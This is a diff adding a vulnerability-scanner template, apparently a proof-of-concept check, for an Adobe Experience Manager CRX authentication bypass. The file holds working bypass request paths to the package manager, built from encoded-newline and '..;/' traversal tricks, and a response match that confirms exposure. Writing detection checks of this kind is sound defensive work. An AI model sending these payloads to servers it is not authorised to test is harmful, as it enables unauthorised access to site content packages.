@@ -1,0 +1,19 @@
+id: poc-yaml-aem-crx-auth-bypass
+info:
+  name: Adobe Experience Manager CRX Auth Bypass漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: AEM
+  osprey-id: vb_2022_0036
+variables:
+  v_path: 'str("/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true")
+
+    str("/content/..;/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true")'
+requests:
+- method: GET
+  path: '{{.v_path}}'
+  expression: 'contains(body, "buildCount") && contains(body, "{\"results\":[{")
+
+    '
+transport: http
